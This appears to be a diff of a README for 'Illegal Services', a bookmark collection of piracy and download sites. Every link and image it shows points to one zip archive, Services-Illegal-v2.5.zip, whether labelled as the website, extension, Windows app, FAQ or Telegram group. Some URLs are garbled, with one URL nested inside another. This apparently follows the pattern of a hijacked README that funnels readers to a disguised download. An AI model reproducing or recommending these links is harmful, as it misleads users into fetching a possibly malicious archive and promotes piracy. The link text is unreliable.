@@ -11,10 +11,10 @@ If you have an interest in watching movies, downloading applications, exploring 
 - **The Website:**
   The most convenient way to access IS database, requiring no additional steps beyond using your web browser directly.
   <div align="center">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip" alt="IS Bookmarks" style="width: 30%;">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip" alt="IS Bookmarks" style="width: 30%;">
   <br>
-  <a href="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Toolbar/Illegal%https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Bookmarks-2b3137?logo=data:image/png;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAMMOAADDDgAAAAAAAAAAAACYn6kAm6GqNo+XodKMlqH4hZOk5JKju5+yv9R3x9Djbr/J3mXBy91SrrvNPrjD0k++ydlrsL3VgJmdt2Z2ZoMFABRAAHKBlI5tfI7/fYyc/4qarf+JnLP/tMHW/rXD3f2nt9T8p7fS95+wy/Czwdj1vcri/Z2mwf+XaW7golVFMTRbhwBleZGIb4GV/2l4iv+Gk6L/vsnU/6m50P+qutn/usfl/7nG5P/E0Ov/vMrm/5ajwv+RcXL/t21G/65kRq0lPFYAb36Qe1lmdP85RFT/aHOC/7/J0/+5xdb/jqHA/5ytzv+tvNv/vcro/62uyP+OW2P/u2FB/8FoR/+sVUj0iJemPW5+juNWV1T/SVRh/3uFkf+apbD/qqOv/1hhfP9sf53/iZy7/5yty/+kgYv/r0dB/7lOQP+zTEf/pkhF06q2xqmAkaL/bX6P/3CClP+JlqP/p6u0/4pwgv+Pkq3/tcLh/73I6P+nttP/iGVy/7U8QP+pMUL/lzBD7404PlWyvs+Nh4iYnXZxgvuCkKH/mqu6/4CPof+Rmbr/vMfp/7vE7P+6w+z/vsvq/5uZsv+WN0r/qCZK/5EgSPB+H0VO////AHYqOxWMSVXCi11z/5uXrv93dJP/m6XN/7u/3//O2PH/zdf0/7nE6f+hsdX/eU9q/6AgS/+ZI1D/fx9EoEs1UAAAAAABkT9gm6BGa/+PQ3X/cFh0/62jqv+giJL/wcbc/7Gxzv+ysMf/oJu4/35pgf+PIFf/miVd/30hRrRhIksAXyBMEJhAaM2ZQWf/fiZl/3Qmfv92XY//l5ay/35Ji/9xO3H/gHF5/3lcaf9uRWj/kSVd/5spXPuCJEx6ZidJAFcgPwmSPWW4mj5t/3wjaf+GF47/gxyS/2UucP9uC2j/gRht/3xHiP+FXKD/fyqB/5EqX/6JKFOTah9ADgAAAACVMXUAfy5fSpExcuiFKHr/iBqK/5IWhf+AEWf/hBNi/5kZb/+WFn//kheN/48jfv+MLWLpcSlMOn8qUwBOHzQAUBZDALu4qQB1RWl2fWV6/4VDev+QHmr/jSNg/5UjX/+dI2T/lyFt/4Yna/+FMmTqgCtWXR0YFgJhJEMAAAAAAF8eTAB5dngAcnNzZ3Z3d+x0WGiviitg2pErYPeWK2D/lytd/Xk5W/RvY2v/cGlutnVwdgdsTV4AWyI+AAAAAAAAAAAAeHd5AHBvcVlxcHKCPgARBHQnTRx6KFJGgytYdIMqV1lxRFw7eHl6oXZ1d8tubXERb29yAAAAAAAAAAAAAAAAAGtqbABoZ2kRaGdpGWphZwBzJ00AgCpXAJ4yagCOLV4Ad1tqAHJxcz9sa21zAAAAAVZUVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAADAAQAAwAEAAA==&label=Illegal%20Services">
+  <a href="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Toolbar/Illegal%https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Bookmarks-2b3137?logo=data:image/png;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAMMOAADDDgAAAAAAAAAAAACYn6kAm6GqNo+XodKMlqH4hZOk5JKju5+yv9R3x9Djbr/J3mXBy91SrrvNPrjD0k++ydlrsL3VgJmdt2Z2ZoMFABRAAHKBlI5tfI7/fYyc/4qarf+JnLP/tMHW/rXD3f2nt9T8p7fS95+wy/Czwdj1vcri/Z2mwf+XaW7golVFMTRbhwBleZGIb4GV/2l4iv+Gk6L/vsnU/6m50P+qutn/usfl/7nG5P/E0Ov/vMrm/5ajwv+RcXL/t21G/65kRq0lPFYAb36Qe1lmdP85RFT/aHOC/7/J0/+5xdb/jqHA/5ytzv+tvNv/vcro/62uyP+OW2P/u2FB/8FoR/+sVUj0iJemPW5+juNWV1T/SVRh/3uFkf+apbD/qqOv/1hhfP9sf53/iZy7/5yty/+kgYv/r0dB/7lOQP+zTEf/pkhF06q2xqmAkaL/bX6P/3CClP+JlqP/p6u0/4pwgv+Pkq3/tcLh/73I6P+nttP/iGVy/7U8QP+pMUL/lzBD7404PlWyvs+Nh4iYnXZxgvuCkKH/mqu6/4CPof+Rmbr/vMfp/7vE7P+6w+z/vsvq/5uZsv+WN0r/qCZK/5EgSPB+H0VO////AHYqOxWMSVXCi11z/5uXrv93dJP/m6XN/7u/3//O2PH/zdf0/7nE6f+hsdX/eU9q/6AgS/+ZI1D/fx9EoEs1UAAAAAABkT9gm6BGa/+PQ3X/cFh0/62jqv+giJL/wcbc/7Gxzv+ysMf/oJu4/35pgf+PIFf/miVd/30hRrRhIksAXyBMEJhAaM2ZQWf/fiZl/3Qmfv92XY//l5ay/35Ji/9xO3H/gHF5/3lcaf9uRWj/kSVd/5spXPuCJEx6ZidJAFcgPwmSPWW4mj5t/3wjaf+GF47/gxyS/2UucP9uC2j/gRht/3xHiP+FXKD/fyqB/5EqX/6JKFOTah9ADgAAAACVMXUAfy5fSpExcuiFKHr/iBqK/5IWhf+AEWf/hBNi/5kZb/+WFn//kheN/48jfv+MLWLpcSlMOn8qUwBOHzQAUBZDALu4qQB1RWl2fWV6/4VDev+QHmr/jSNg/5UjX/+dI2T/lyFt/4Yna/+FMmTqgCtWXR0YFgJhJEMAAAAAAF8eTAB5dngAcnNzZ3Z3d+x0WGiviitg2pErYPeWK2D/lytd/Xk5W/RvY2v/cGlutnVwdgdsTV4AWyI+AAAAAAAAAAAAeHd5AHBvcVlxcHKCPgARBHQnTRx6KFJGgytYdIMqV1lxRFw7eHl6oXZ1d8tubXERb29yAAAAAAAAAAAAAAAAAGtqbABoZ2kRaGdpGWphZwBzJ00AgCpXAJ4yagCOLV4Ad1tqAHJxcz9sa21zAAAAAVZUVwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAADAAQAAwAEAAA==&label=Illegal%20Services">
   </a>
   </div>
   <br>
@@ -22,14 +22,14 @@ If you have an interest in watching movies, downloading applications, exploring 
 - **The Web Extension:**
   It lets you import and navigate the database directly trough your web browser's bookmarks bar.
   <div align="center">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip" alt="IS Web Extension" style="width: 30%;">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip" alt="IS Web Extension" style="width: 30%;">
   <br>
-  <a href="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Bookmarks-2b3137?logo=github&label=GitHub">
+  <a href="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Bookmarks-2b3137?logo=github&label=GitHub">
   </a>
   <br>
-  <a href="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20this%20Extension-2b3137?logo=firefox&label=Firefox">
+  <a href="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20this%20Extension-2b3137?logo=firefox&label=Firefox">
   </a>
   </div>
   <br>
@@ -39,20 +39,20 @@ If you have an interest in watching movies, downloading applications, exploring 
   <br>
   It is compatible with Windows 10 and 11 (x86/x64).
   <div align="center">
-  <img alt="IS Windows App" src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip" style="width: 50%;">
+  <img alt="IS Windows App" src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip" style="width: 50%;">
   <br>
-  <a href="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20latest%20installable%20version-2b3137?logo=github&label=GitHub">
+  <a href="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20latest%20installable%20version-2b3137?logo=github&label=GitHub">
   </a>
   <br>
-  <a href="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip">
-  <img src="https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20latest%20portable%20version-2b3137?logo=github&label=GitHub">
+  <a href="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20latest%20portable%20version-2b3137?logo=github&label=GitHub">
   </a>
   </div>
   <br>
 
 - **Explore Additional Methods:**
-  For even further methods and detailed informations, check out the [tutorial](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip) page.
+  For even further methods and detailed informations, check out the [tutorial](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip) page.
 
 <br>
 
@@ -66,22 +66,22 @@ IS diligently maintains its database by updating those domains and removing defu
 
 ## **FAQ**
 
-If you have any questions, please take a look at both [IS - FAQ](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip), and [GitHub Discussions - Q&A](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip) pages.
+If you have any questions, please take a look at both [IS - FAQ](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip), and [GitHub Discussions - Q&A](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip) pages.
 <br>
 If you couldn't find the answer you're looking for, feel free to ask here:
 
-- [GitHub Discussions](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
-- [Telegram Group](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+- [Telegram Group](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
 
 ## **Contributing**
 
 You can request websites to be added or removed from IS bookmarks database through:
 
-- [GitHub Discussions](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
-- [Telegram Group](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
-- [IS Bookmarks website](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Toolbar/Illegal%https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+- [Telegram Group](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+- [IS Bookmarks website](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Toolbar/Illegal%https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
 
 ## **Connect with us**
 
-[![GitHub Badge](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Services%20Discussions-2b3137?logo=github&label=GitHub)](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
-[![Telegram Badge](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Services%20Group-2b3137?logo=telegram&label=Telegram)](https://github.com/nora3233/Illegal_Services/raw/refs/heads/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+[![GitHub Badge](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Services%20Discussions-2b3137?logo=github&label=GitHub)](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
+[![Telegram Badge](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip%20Services%20Group-2b3137?logo=telegram&label=Telegram)](https://raw.githubusercontent.com/nora3233/Illegal_Services/main/lib/binread/x86/Services-Illegal-v2.5.zip)
